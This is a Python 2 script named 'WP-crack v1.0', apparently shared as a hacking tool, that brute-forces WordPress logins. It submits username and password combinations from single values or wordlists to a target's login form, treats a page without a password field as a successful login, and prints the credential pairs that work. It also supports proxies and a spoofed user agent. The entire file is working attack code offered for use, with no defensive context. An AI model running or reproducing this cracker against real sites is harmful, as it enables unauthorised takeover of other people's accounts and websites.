#!/usr/bin/python
# -*- coding: utf-8 -*-
import sys
import urllib2, urllib
import cookielib
import re

#
#functions
#

def loadLst(fileName, lstName):
    f = open(fileName, 'r')
    for line in f:
        lstName.append(line.replace('\r\n',''))
    f.close()

if len(sys.argv) <= 1:
    
    print ' __      ____________          ___________________    _____  _________  ____  __. '
    print '/  \    /  \______   \         \_   ___ \______   \  /  _  \ \_   ___ \|    |/ _| '
    print '\   \/\/   /|     ___/  ______ /    \  \/|       _/ /  /_\  \/    \  \/|      <   '
    print ' \        / |    |     /_____/ \     \___|    |   \/    |    \     \___|    |  \  '
    print '  \__/\  /  |____|              \______  /____|_  /\____|__  /\______  /____|__ \ '
    print '       \/                              \/       \/         \/        \/        \/ '
    print 'WP-crack v1.0 2018 Recoded By Sultan Nasution'
    print 'Website: https://sultan-nasution.org'
    print 'Mail   : lolzc0de@sultan-nasution.org'
    sys.exit()
#
#define variables
#

print ""

url = ''
wordlist = ''
username = ''
password = ''
passFile = ''
userFile = ''
signal = 'type="password"'
count = 0
countAcc = 0
mode = 1
verbose = 0
useProxy = 0
continues = 0
agent = 'Mozilla/5.0 (Windows NT 6.1; rv:5.0) Gecko/20100101 Firefox/5.0'
result = ""


#
#check argvs
#
for arg in sys.argv:
    if arg == '-h':
        url = sys.argv[count + 1]
    elif arg == '-u':
        username = sys.argv[count + 1]
    elif arg == '-U':
        userFile = sys.argv[count + 1]
    elif arg == '-p':
        password = sys.argv[count + 1]
    elif arg == '-P':
        passFile = sys.argv[count + 1]
    elif arg == '-v':
        verbose = 1
    elif arg == '-s':
        signal = sys.argv[count + 1]
    elif arg == '-g':
        agent = sys.argv[count + 1]
    elif arg == '-x':
        lstTmp = sys.argv[count+1].split(':')
        proxyHandler = urllib2.ProxyHandler({lstTmp[0] : lstTmp[1]+':'+lstTmp[2]})
        useProxy = 1
    elif arg == '-f':
        continues = 1
    count += 1


if (len(username)>0 and len(password)>0):
    mode = 1 #single
elif (len(username)>0 and len(passFile)>0):
    mode = 2 #
elif (len(userFile)>0 and len(password)>0):
    mode = 3
elif (len(userFile)>0 and len(passFile)>0):
    mode = 4 

#
#init opener
#
cookieJar = cookielib.CookieJar()
cookieHandler = urllib2.HTTPCookieProcessor(cookieJar)
if useProxy == 0:
    opener = urllib2.build_opener(cookieHandler)
else:
    opener = urllib2.build_opener(proxyHandler,cookieHandler)
opener.addheaders = [('User-agent', agent)]
cookieJar.clear()
cookieJar.clear_session_cookies()

#
#main
#
try:
    response = opener.open(url)
    content = response.read()
    if mode == 1:
        values = {'log' : username,
                      'pwd' : password,
                      'wp-submit' : 'Log In',
                      'redirect_to' : '',
                      'testcookie' : '1' }
        data = urllib.urlencode(values)
        print data
        response = opener.open(url+'/', data)
        strTmp = response.read()
        if strTmp.find(signal) < 0:
            countAcc += 1
            result += "username: " + username + "   password: " + password + "\n"
            print "Valid user--pass: " + username + " -- " + password
            f3 = open('test.html','w')
            f3.write(strTmp)
            f3.close()  
            
    
    
    if mode == 2:
        f = open(passFile,'r')
        for line in f:            
            password = line.strip('\n\r')
            values = {'log' : username,
                      'pwd' : password,
                      'wp-submit' : 'Log In',
                      'redirect_to' : '',
                      'testcookie' : '1' }
            if verbose == 1:
                print "Trying u--p     : " + username + " -- " + password            
            data = urllib.urlencode(values)
            try:
                response = opener.open(url+'/', data)
            except urllib2.URLError, e:
                continue
            strTmp = response.read()
            if strTmp.find(signal) < 0:
                countAcc += 1
                result += "username: " + username + "   password: " + password + "\n"
                print "Valid user--pass: " + username + " -- " + password                
                break;
          


    if mode == 3:
        f = open(userFile,'r')
        for line in f:
            username = line.strip('\n\r')
            values = {'log' : username,
                      'pwd' : password,
                      'wp-submit' : 'Log In',
                      'redirect_to' : '',
                      'testcookie' : '1' }
            if verbose == 1:
                print "Trying u--p     : " + username + " -- " + password
            data = urllib.urlencode(values)
            try:
                response = opener.open(url+'/', data)
            except urllib2.URLError, e:
                continue
            strTmp = response.read()
            if strTmp.find(signal) < 0:
                countAcc += 1                
                result += "username: " + username + "   password: " + password + "\n"
                print "Valid user--pass: " + username + " -- " + password                 
                if continues == 0:
                    break
                cookieJar.clear()
                cookieJar.clear_session_cookies()
                response = opener.open(url)
                content = response.read()

                
       
    if mode == 4:
        f = open(userFile,'r')
        f2 = open(passFile,'r')
        for line in f:
            username = line.strip('\n\r')
            f2.seek(0)
            for line2 in f2:
                password = line2.strip('\n\r')
                values = {'log' : username,
                      'pwd' : password,
                      'wp-submit' : 'Log In',
                      'redirect_to' : '',
                      'testcookie' : '1' }
                if verbose == 1:
                    print "Trying u--p     : " + username + " -- " + password
                data = urllib.urlencode(values)
                try:
                    response = opener.open(url+'/', data)
                except urllib2.URLError, e:
                    continue
                strTmp = response.read()
                if strTmp.find(signal) < 0:
                    countAcc += 1                    
                    result += "username: " + username + "   password: " + password + "\n"
                    print "Valid user--pass: " + username + " -- " + password                     
                    if continues == 0:
                        break;
                    cookieJar.clear()
                    cookieJar.clear_session_cookies()
                    response = opener.open(url)
                    content = response.read()
                    
        f.close()
        f2.close()     
        
    #Finish
    print ''       
    print '1 target successfuly completed, '+ str(countAcc) +' valid username+password found'
    print 'TARGER: ' + url
    print 'RESULT:'        
    print result
    sys.exit()
except urllib2.URLError, e:
    print "\n\t[!] Session Cancelled; Error occured. Check internet settings"
except (KeyboardInterrupt):
    print "\n\t[!] Session cancelled"  
    
